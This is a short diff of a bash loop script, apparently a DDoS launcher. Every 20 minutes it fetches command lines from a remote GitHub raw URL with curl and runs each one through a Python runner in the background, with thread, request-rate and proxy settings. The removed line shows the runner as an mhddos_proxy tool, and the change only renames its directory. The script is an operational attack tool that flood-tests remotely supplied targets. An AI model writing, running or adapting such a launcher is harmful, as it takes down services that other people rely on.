@@ -49,7 +49,7 @@ do
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/dep-x/bash/main/run  | cat | grep "^[^#]")")
             echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
+            python3 ~/proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
 sleep 20m
 done
